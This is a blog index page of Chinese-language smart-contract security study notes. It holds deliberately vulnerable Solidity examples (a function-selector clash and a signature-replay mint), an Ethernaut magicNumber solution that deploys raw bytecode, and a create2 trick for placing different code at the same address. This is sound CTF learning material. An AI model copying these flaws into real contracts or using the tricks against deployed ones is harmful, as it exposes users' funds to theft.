    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/">selector crash</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract SelectorClash &#123;</span><br><span class="line">    bool public solved; // 攻击是否成功</span><br><span class="line"></span><br><span class="line">    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。</span><br><span class="line">    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Not Owner&quot;);</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。</span><br><span class="line">    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;</span><br><span class="line">        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S02_SelectorClash">从这里可以找到合适的找到碰撞的工具</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/" data-id="clxvwvx6e0026rkudfqnvcfgq" data-title="selector crash" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/重放攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/">重放攻击</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="签名重放"><a href="#签名重放" class="headerlink" title="签名重放"></a>签名重放</h3><p><a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S06_SignatureReplay">签名空投的时候没有对已经使用过的签名进行标记</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 权限管理错误例子</span><br><span class="line">contract SigReplay is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    address public signer;</span><br><span class="line"></span><br><span class="line">    // 构造函数：初始化代币名称和代号</span><br><span class="line">    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;</span><br><span class="line">        signer = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 有签名重放漏洞的铸造函数</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b</span><br><span class="line">     */</span><br><span class="line">    function badMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));</span><br><span class="line">        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be</span><br><span class="line">     */</span><br><span class="line">    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(abi.encodePacked(to, amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 获得以太坊签名消息</span><br><span class="line">     * `hash`：消息哈希 </span><br><span class="line">     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span><br><span class="line">     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`</span><br><span class="line">     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。</span><br><span class="line">     */</span><br><span class="line">    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;</span><br><span class="line">        // 32 is the length in bytes of hash,</span><br><span class="line">        // enforced by the type signature above</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ECDSA验证</span><br><span class="line">    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;</span><br><span class="line">        return ECDSA.recover(_msgHash, _signature) == signer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/" data-id="clxvwvx6f0028rkud3c7de0qv" data-title="重放攻击" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/ethernaut/magicNumber" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/" class="article-date">
  <time class="dt-published" datetime="2023-11-26T16:00:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/">magicNumber</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>不知道这道题在干什么？看看这个吧，这是这个题目的脚本<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image.png" alt="Alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solver solver = Solver(instance.solver());</span><br></pre></td></tr></table></figure>
<p>如果小合约有不止一个方法可以自动调用吗</p>
<p>###create方法</p>
<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-4.png" alt="Alt text"></p>
<p>这整个是合约的创建时代码<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-2.png" alt="Alt text"></p>
<p>这是合约的运行时代码，因为在return里面<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-3.png" alt="Alt text"></p>
<p>这个时候，如果将ffffffff换做可以运行的代码呢</p>
<p>比如：创建一个名为whatisthemeaningoflife()的方法并只返回42这个数字</p>
<p>但是利用assembly我并不知道怎么创建出一个特定名字的方法，怎么办呢<br>  是否能试着创建一个receive呢？<br>  开始我怎么知道这是reveive？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address deployedContractAddress;</span><br><span class="line">assembly &#123;</span><br><span class="line">    let ptr := mload(0x40)</span><br><span class="line">    mstore(ptr, shl(0x68, 0x69602A60005260206000F3600052600A6016F3))</span><br><span class="line">    deployedContractAddress := create(0, ptr, 0x13)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<p>EIP1167</p>
<p>当需要空头的合约很多时，创建合约的费用达到了一定的值，这个时候就需要降低合约的成本<br>所以，EIP1167就是：<br>以最小的代价拷贝一个已有合约的实现，减少gas费用消耗，提升数据安全<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-1.png" alt="Alt text"></p>
<p>###对比分析 - eip1967可升级合约的beacon批量代理方案<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-8.png" alt="Alt text"><br>图中的访问logic合约是用delegatecall实现的</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/" data-id="clxvwvx5r0014rkudfomydjtm" data-title="magicNumber" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/不同合约相同地址" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%B8%8D%E5%90%8C%E5%90%88%E7%BA%A6%E7%9B%B8%E5%90%8C%E5%9C%B0%E5%9D%80/" class="article-date">
  <time class="dt-published" datetime="2023-11-26T16:00:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%B8%8D%E5%90%8C%E5%90%88%E7%BA%A6%E7%9B%B8%E5%90%8C%E5%9C%B0%E5%9D%80/">不同合约相同地址</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>摘要：<br>如何让不同的合约代码存在于相同的合约地址中<br>create2同一个地址两次会发生什么，生成address0<br>快速写迷你合约，用create2<br>放入同一个文本内的两篇合约，remix编辑的是第一篇合约</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // 这个bytes就是下面那篇合约的opcode</span><br><span class="line">        bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">  // 生成的地址是根据传入参数决定的，也就是传入的bytecode，但逻辑是由constructor的return决定的，</span><br><span class="line">  // 因此改变return就可以做到不同的合约代码拥有同一地址</span><br><span class="line">            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x0a)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>快速写迷你合约，不用create，而是用create2，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract Mini&#123;</span><br><span class="line"></span><br><span class="line">function getMini()external returns (address)&#123;</span><br><span class="line">  address a;</span><br><span class="line">  bytes memory code= hex&#x27;6133ff6000526002601eF3&#x27;;</span><br><span class="line">  </span><br><span class="line">  assembly&#123;</span><br><span class="line">  a := create2(0, add(0x20, code), mload(code), 0x0a)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">return  a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%B8%8D%E5%90%8C%E5%90%88%E7%BA%A6%E7%9B%B8%E5%90%8C%E5%9C%B0%E5%9D%80/" data-id="clxvwvx69001xrkud5lca8h7r" data-title="不同合约相同地址" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/magicChallenge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" class="article-date">
  <time class="dt-published" datetime="2023-11-25T13:22:20.028Z" itemprop="datePublished">2023-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>思路一：在_transfer中做文章，想办法让selltime多减一次</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" data-id="clxvwvx67001trkud1by2dlwz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/10/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/12/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">June 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/06/26/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/06/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/ecrecover/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/06/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/stackTooDeep/">stack too deep</a>
          </li>
        
          <li>
            <a href="/2024/06/18/%E5%95%86%E7%A7%91/%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%87%91%E8%9E%8D/%E8%AE%BA%E6%96%87/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/06/17/%E5%95%86%E7%A7%91/ERC4626/">ERC4626</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 fathergun<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>